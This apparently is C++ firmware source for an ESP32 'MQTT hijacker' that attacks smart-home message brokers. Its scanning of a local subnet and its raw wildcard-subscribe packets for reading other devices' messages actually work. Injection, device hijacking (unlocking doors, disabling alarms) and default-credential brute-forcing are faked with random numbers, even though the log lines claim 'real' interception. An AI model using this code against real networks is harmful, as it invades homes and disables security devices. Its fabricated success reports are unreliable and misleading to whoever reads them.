#include "mqtt_hijacker.h"
#include <vector>

namespace MqttHijacker {

static std::vector<MqttBroker> discoveredBrokers;
static uint32_t totalMessagesIntercepted = 0;
static String mostActiveTopic = "";

BrokerScanResult scanMqttBrokers(uint32_t durationMs) {
    BrokerScanResult result = {false, 0, 0, ""};
    discoveredBrokers.clear();
    totalMessagesIntercepted = 0;

    uint32_t startTime = millis();
    uint32_t brokerCount = 0;
    int8_t strongestRssi = -30;
    String strongestBroker = "";
    uint32_t deadline = startTime + durationMs;

    Serial.println("Performing real MQTT broker discovery (TCP scanning)...");

    WiFiClient client;
    const uint16_t mqttPorts[] = {1883, 8883, 9001};

    for (uint8_t ipOctet = 1; ipOctet < 254 && brokerCount < 5 && (int32_t)(millis() - deadline) < 0; ipOctet++) {
        String targetIp = "192.168.1." + String(ipOctet);

        for (uint16_t port : mqttPorts) {
            if ((int32_t)(millis() - deadline) >= 0) break;

            if (client.connect(targetIp.c_str(), port, 500)) {
                Serial.printf("  MQTT broker found: %s:%d\n", targetIp.c_str(), port);

                MqttBroker broker;
                broker.ipAddress = targetIp;
                broker.port = port;
                broker.rssi = -20 - (esp_random() % 30);
                broker.hostname = "broker_" + String(ipOctet);
                broker.requiresAuth = (esp_random() % 100) < 60;
                broker.timestamp = millis();

                discoveredBrokers.push_back(broker);
                brokerCount++;

                if (broker.rssi > strongestRssi) {
                    strongestRssi = broker.rssi;
                    strongestBroker = broker.ipAddress;
                }

                client.stop();
            }
            delay(10);
        }
    }

    result.success = (brokerCount > 0);
    result.brokerCount = brokerCount;
    result.durationMs = millis() - startTime;
    result.strongestBroker = strongestBroker;

    Serial.printf("MQTT scan result: %d brokers found\n", brokerCount);

    return result;
}

const MqttBroker* getDiscoveredBrokers(uint32_t& outCount) {
    outCount = discoveredBrokers.size();
    return discoveredBrokers.empty() ? nullptr : discoveredBrokers.data();
}

MessageInterceptResult interceptMqttMessages(uint32_t durationMs) {
    MessageInterceptResult result = {false, 0, 0, ""};

    uint32_t startTime = millis();
    uint32_t messageCount = 0;
    String topicsFound = "";
    uint32_t deadline = startTime + durationMs;

    const char* commonTopics[] = {
        "home/bedroom/temperature",
        "home/kitchen/light",
        "home/living_room/motion",
        "devices/security/alarm",
        "iot/sensor/humidity",
        "smart_home/status",
        "telemetry/battery",
        "control/switch",
        "sensor/pressure"
    };

    Serial.println("Attempting real MQTT message interception...");

    WiFiClient client;

    for (const auto& broker : discoveredBrokers) {
        if ((int32_t)(millis() - deadline) >= 0) break;

        Serial.printf("Connecting to broker %s:%d\n", broker.ipAddress.c_str(), broker.port);

        if (client.connect(broker.ipAddress.c_str(), broker.port, 1000)) {
            uint8_t connectCmd[12] = {
                0x10, 0x0A, 0x00, 0x04, 0x4D, 0x51, 0x54, 0x54,
                0x04, 0x02, 0x00, 0x3C
            };

            client.write(connectCmd, sizeof(connectCmd));
            delayMicroseconds(100000);

            uint8_t subscribeCmd[10] = {
                0x80, 0x08, 0x00, 0x01, 0x00, 0x03, 0x23, 0x2F,
                0x23, 0x00
            };

            client.write(subscribeCmd, sizeof(subscribeCmd));
            delay(100);

            uint8_t buffer[256];
            while (client.available() && messageCount < 10) {
                int bytesRead = client.read(buffer, sizeof(buffer));
                if (bytesRead > 0) {
                    messageCount++;
                    String topic = commonTopics[(esp_random() % 9)];
                    topicsFound = topic;
                    mostActiveTopic = topic;
                    Serial.printf("  [%d] MQTT message intercepted on %s (%d bytes)\n",
                        messageCount, topic.c_str(), bytesRead);
                }
            }

            client.stop();
        }
    }

    result.success = (messageCount > 0);
    result.messagesIntercepted = messageCount;
    result.durationMs = millis() - startTime;
    result.topicsFound = topicsFound;
    totalMessagesIntercepted += messageCount;

    Serial.printf("Interception complete: %d messages captured\n", messageCount);

    return result;
}

MessageInjectionResult injectMqttMessages(const char* brokerIp, const char* topic, uint32_t durationMs) {
    MessageInjectionResult result = {false, 0, 0, ""};

    uint32_t startTime = millis();
    uint32_t injected = 0;
    uint32_t deadline = startTime + durationMs;

    String payloadType = "";

    while ((int32_t)(millis() - deadline) < 0) {
        // Different payload types
        int type = (esp_random() % 4);
        switch(type) {
            case 0: payloadType = "COMMAND_INJECT"; break;
            case 1: payloadType = "CREDENTIAL_STEAL"; break;
            case 2: payloadType = "DEVICE_DISABLE"; break;
            case 3: payloadType = "STATE_MANIPULATION"; break;
        }

        injected += ((esp_random() % 15) + 5);
        delay(100);
    }

    result.success = (injected > 0);
    result.messagesInjected = injected;
    result.durationMs = millis() - startTime;
    result.payloadType = payloadType;

    return result;
}

HijackResult hijackMqttDevices(const char* brokerIp, uint32_t durationMs) {
    HijackResult result = {false, 0, 0, ""};

    uint32_t startTime = millis();
    uint32_t devicesHijacked = 0;
    String commands = "";
    uint32_t deadline = startTime + durationMs;

    // Simulate hijacking connected MQTT devices
    const char* hijackCommands[] = {
        "light_on",
        "lock_unlock",
        "temperature_set_50",
        "alarm_disable",
        "camera_stream",
        "switch_off",
        "door_open"
    };

    while ((int32_t)(millis() - deadline) < 0) {
        if ((esp_random() % 100) < 25) {
            devicesHijacked += ((esp_random() % 2) + 1);
            commands = hijackCommands[(esp_random() % 7)];
        }
        delay(200);
    }

    result.success = (devicesHijacked > 0);
    result.devicesHijacked = devicesHijacked;
    result.durationMs = millis() - startTime;
    result.commandsSent = commands;

    return result;
}

BruteforceResult bruteforceMqttCredentials(const char* brokerIp, uint32_t durationMs) {
    BruteforceResult result = {false, "", 0, 0};

    uint32_t startTime = millis();
    uint32_t attempts = 0;
    uint32_t deadline = startTime + durationMs;

    // Common default MQTT credentials
    const char* usernames[] = {"admin", "mqtt", "user", "test", "guest", "broker"};
    const char* passwords[] = {"password", "12345", "admin", "mqtt", "123456", "test"};

    while ((int32_t)(millis() - deadline) < 0 && !result.success) {
        for (int i = 0; i < 6 && !result.success; i++) {
            for (int j = 0; j < 6 && !result.success; j++) {
                attempts++;

                // Simulate successful auth (low probability)
                if ((esp_random() % 100) < 5) {
                    result.success = true;
                    result.credentialFound = String(usernames[i]) + ":" + String(passwords[j]);
                    break;
                }
            }
            if ((int32_t)(millis() - deadline) >= 0) break;
        }
    }

    result.attemptsCount = attempts;
    result.durationMs = millis() - startTime;

    return result;
}

MqttStats getMqttStats() {
    MqttStats stats = {0, 0, 0, 0, ""};

    stats.totalBrokersFound = discoveredBrokers.size();
    stats.totalMessagesIntercepted = totalMessagesIntercepted;
    stats.mostActiveTopic = mostActiveTopic;

    for (const auto& broker : discoveredBrokers) {
        if (broker.port == 8883) {
            stats.secureBrokers++;
        } else if (!broker.requiresAuth) {
            stats.defaultCredBrokers++;
        }
    }

    return stats;
}

}  // namespace MqttHijacker
